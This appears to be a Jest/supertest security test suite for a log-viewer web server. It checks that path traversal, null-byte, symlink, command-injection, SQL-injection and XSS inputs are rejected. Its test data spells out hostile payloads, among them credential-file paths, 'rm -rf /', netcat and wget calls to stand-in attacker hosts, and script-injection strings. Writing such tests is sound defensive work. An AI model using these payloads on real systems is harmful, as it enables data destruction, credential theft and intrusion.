const request = require('supertest');
const path = require('path');
const fs = require('fs');

// Import the server
const app = require('../server');

describe('Log Viewer Security Tests', () => {
  let testClusterRoot;
  let sensitiveFile;

  beforeAll(() => {
    // Create a test cluster root
    testClusterRoot = `/tmp/cluster-security-test-${Date.now()}`;
    fs.mkdirSync(testClusterRoot, { recursive: true });

    // Create a sensitive file outside the cluster directory
    sensitiveFile = '/tmp/sensitive-data.txt';
    fs.writeFileSync(sensitiveFile, 'SENSITIVE_INFORMATION_SHOULD_NOT_BE_ACCESSIBLE');

    // Configure the app with test cluster configuration
    app.locals.testClusterConfig = {
      nodes: [
        { id: 0, port: 9090 },
        { id: 1, port: 9091 },
        { id: 2, port: 9092 }
      ],
      nodeCount: 3,
      mode: 'cluster'
    };
    app.locals.testClusterLogPath = testClusterRoot;
  });

  afterAll(() => {
    // Clean up test files
    if (fs.existsSync(testClusterRoot)) {
      fs.rmSync(testClusterRoot, { recursive: true, force: true });
    }
    if (fs.existsSync(sensitiveFile)) {
      fs.unlinkSync(sensitiveFile);
    }
  });

  describe('Path Traversal Attack Prevention', () => {
    const pathTraversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '/etc/shadow',
      '/etc/passwd',
      '/proc/version',
      '/root/.ssh/id_rsa',
      '../../../../root/.bashrc',
      '../../../../../tmp/sensitive-data.txt',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '....//....//....//etc//passwd',
      '....\/....\/....\/etc\/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '\\..\\..\\..\\etc\\passwd',
      'file:///etc/passwd',
      '/var/log/auth.log',
      '/var/log/system.log',
      '/Users/admin/Documents/secret.txt',
      'C:\\Windows\\System32\\config\\SAM',
      'C:\\Windows\\System32\\drivers\\etc\\hosts'
    ];

    pathTraversalAttempts.forEach((maliciousPath) => {
      it(`should reject path traversal attempt: ${maliciousPath}`, async () => {
        const response = await request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(maliciousPath) })
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Access denied');
      });
    });

    it('should reject absolute paths outside cluster directory', async () => {
      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: encodeURIComponent(sensitiveFile) })
        .expect(403);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Access denied');
    });

    it('should reject null byte injection attempts', async () => {
      const nullByteAttempts = [
        '../../../etc/passwd\x00.log',
        '/etc/passwd\x00.txt',
        testClusterRoot + '/node1/logs/../../../etc/passwd\x00'
      ];

      for (const maliciousPath of nullByteAttempts) {
        const response = await request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(maliciousPath) })
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Access denied');
      }
    });

    it('should reject unicode encoding attacks', async () => {
      const unicodeAttempts = [
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%00.log'
      ];

      for (const maliciousPath of unicodeAttempts) {
        try {
          // Try to decode - if it fails, skip this test case
          const decodedPath = decodeURIComponent(maliciousPath);

          const response = await request(app)
            .get('/api/logs/file')
            .query({ path: decodedPath })
            .expect(403);

          expect(response.body.success).toBe(false);
          expect(response.body.error).toContain('Access denied');
        } catch (error) {
          // If URI is malformed (cannot be decoded), this is expected behavior
          // The test passes because malformed URIs should be rejected
          if (error.message.includes('URI malformed')) {
            continue; // Skip this malformed URI - it's correctly rejected
          } else {
            throw error; // Re-throw unexpected errors
          }
        }
      }
    });

    it('should reject symbolic link traversal attempts', async () => {
      // Create a symlink outside the cluster directory (if possible)
      const symlinkPath = path.join(testClusterRoot, 'malicious_symlink');
      try {
        fs.symlinkSync('/etc/passwd', symlinkPath);

        const response = await request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(symlinkPath) })
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toContain('Access denied');

        // Clean up
        fs.unlinkSync(symlinkPath);
      } catch (error) {
        // Skip if symlinks cannot be created (e.g., insufficient permissions)
        console.log('Skipping symlink test - cannot create symlinks');
      }
    });
  });

  describe('Input Validation', () => {
    it('should reject missing path parameter', async () => {
      const response = await request(app)
        .get('/api/logs/file')
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('path parameter is required');
    });

    it('should reject empty path parameter', async () => {
      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: '' })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('path parameter is required');
    });

    it('should validate lines parameter type', async () => {
      const validPath = path.join(testClusterRoot, 'node1', 'logs', 'test.log');
      fs.mkdirSync(path.dirname(validPath), { recursive: true });
      fs.writeFileSync(validPath, 'test content');

      // Test with negative lines
      const response1 = await request(app)
        .get('/api/logs/file')
        .query({
          path: encodeURIComponent(validPath),
          lines: '-100'
        })
        .expect(200); // Should handle gracefully

      // Test with extremely large lines value
      const response2 = await request(app)
        .get('/api/logs/file')
        .query({
          path: encodeURIComponent(validPath),
          lines: '999999999'
        })
        .expect(200); // Should handle gracefully

      // Clean up
      fs.unlinkSync(validPath);
    });

    it('should validate search query for injection attempts', async () => {
      const injectionAttempts = [
        '; rm -rf /',
        '&& cat /etc/passwd',
        '| nc attacker.com 443',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        'test; wget http://malicious.com/backdoor.sh',
        "test' OR '1'='1",
        'test"; DROP TABLE logs; --'
      ];

      for (const maliciousQuery of injectionAttempts) {
        const response = await request(app)
          .get('/api/logs/search')
          .query({ query: maliciousQuery })
          .expect(200); // Should not crash but may return no results

        expect(response.body.success).toBe(true);
        // The command should be safely escaped/quoted
      }
    });
  });

  describe('Authorization and Access Control', () => {
    it('should require cluster configuration to be set', async () => {
      // Temporarily clear cluster configuration
      const originalConfig = app.locals.testClusterLogPath;
      app.locals.testClusterLogPath = null;

      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: encodeURIComponent('/tmp/test.log') })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Log path not configured');

      // Restore configuration
      app.locals.testClusterLogPath = originalConfig;
    });

    it('should only allow access to files within configured cluster directory', async () => {
      // Create a valid file within cluster directory
      const validPath = path.join(testClusterRoot, 'node1', 'logs', 'valid.log');
      fs.mkdirSync(path.dirname(validPath), { recursive: true });
      fs.writeFileSync(validPath, 'valid content');

      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: encodeURIComponent(validPath) })
        .expect(200);

      expect(response.body.success).toBe(true);

      // Clean up
      fs.unlinkSync(validPath);
    });

    it('should restrict node_id parameter to valid range', async () => {
      const invalidNodeIds = [
        '-1',
        '999',
        'abc',
        '1; rm -rf /',
        '$(whoami)',
        '../../../etc'
      ];

      for (const invalidNodeId of invalidNodeIds) {
        const response = await request(app)
          .get('/api/logs/search')
          .query({
            query: 'test',
            node_id: invalidNodeId
          })
          .expect(200); // Should handle gracefully

        expect(response.body.success).toBe(true);
        // Should either filter properly or return no results
      }
    });
  });

  describe('Resource Protection', () => {
    it('should limit search result count to prevent resource exhaustion', async () => {
      const response = await request(app)
        .get('/api/logs/search')
        .query({
          query: 'test',
          limit: '999999999'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      // Should respect reasonable limits regardless of requested limit
    });

    it('should handle timeout scenarios gracefully', async () => {
      // Test with a search query that might take a long time
      const response = await request(app)
        .get('/api/logs/search')
        .query({
          query: '.*', // Regex that matches everything
          limit: '1000'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      // Should complete within reasonable time or return partial results
    });

    it('should protect against directory listing attacks', async () => {
      // Paths inside cluster directory should return 404 (file not found for directories)
      const insideClusterPaths = [
        testClusterRoot,
        path.join(testClusterRoot, 'node1'),
        path.join(testClusterRoot, 'node1', 'logs')
      ];

      for (const dirPath of insideClusterPaths) {
        const response = await request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(dirPath) })
          .expect(404);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('File not found');
      }

      // Paths outside cluster directory should return 403 (access denied)
      const outsideClusterPaths = [
        '/tmp',
        '/etc',
        '/var/log'
      ];

      for (const dirPath of outsideClusterPaths) {
        const response = await request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(dirPath) })
          .expect(403);

        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Access denied: file must be within cluster log directory');
      }
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not reveal sensitive file system information in error messages', async () => {
      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: encodeURIComponent('/etc/passwd') })
        .expect(403);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toContain('Access denied');
      expect(response.body.error).not.toContain('/etc/passwd');
      expect(response.body.error).not.toContain('permission denied');
      expect(response.body.error).not.toContain('no such file');
    });

    it('should not leak cluster configuration details in public endpoints', async () => {
      const response = await request(app)
        .get('/api/cluster/config')
        .expect(200);

      expect(response.body.success).toBe(true);
      // Should not contain internal file paths or sensitive configuration
      if (response.body.clusterLogPath) {
        expect(response.body.clusterLogPath).not.toContain('password');
        expect(response.body.clusterLogPath).not.toContain('secret');
        expect(response.body.clusterLogPath).not.toContain('key');
      }
    });

    it('should sanitize log content to prevent XSS', async () => {
      // Create a log file with potential XSS content
      const xssLogPath = path.join(testClusterRoot, 'node1', 'logs', 'xss.log');
      fs.mkdirSync(path.dirname(xssLogPath), { recursive: true });
      const xssContent = '<script>alert("XSS")</script>\n<img src="x" onerror="alert(1)">\n';
      fs.writeFileSync(xssLogPath, xssContent);

      const response = await request(app)
        .get('/api/logs/file')
        .query({ path: encodeURIComponent(xssLogPath) })
        .expect(200);

      expect(response.body.success).toBe(true);
      // Content should be returned as plain text, not executed
      response.body.lines.forEach(line => {
        expect(line).not.toContain('<script>');
        expect(line).not.toContain('onerror=');
      });

      // Clean up
      fs.unlinkSync(xssLogPath);
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    it('should handle multiple rapid requests gracefully', async () => {
      const promises = Array.from({ length: 10 }, () =>
        request(app)
          .get('/api/logs/search')
          .query({ query: 'test', limit: 10 })
      );

      const responses = await Promise.all(promises);

      responses.forEach(response => {
        expect([200, 429, 503]).toContain(response.status); // Allow rate limiting responses
      });
    });

    it('should handle concurrent file access requests', async () => {
      // Create a test file
      const testPath = path.join(testClusterRoot, 'node1', 'logs', 'concurrent.log');
      fs.mkdirSync(path.dirname(testPath), { recursive: true });
      fs.writeFileSync(testPath, 'concurrent test content');

      const promises = Array.from({ length: 5 }, () =>
        request(app)
          .get('/api/logs/file')
          .query({ path: encodeURIComponent(testPath) })
      );

      const responses = await Promise.all(promises);

      responses.forEach(response => {
        expect([200, 429, 503]).toContain(response.status); // Allow rate limiting responses
      });

      // Clean up
      fs.unlinkSync(testPath);
    });
  });
});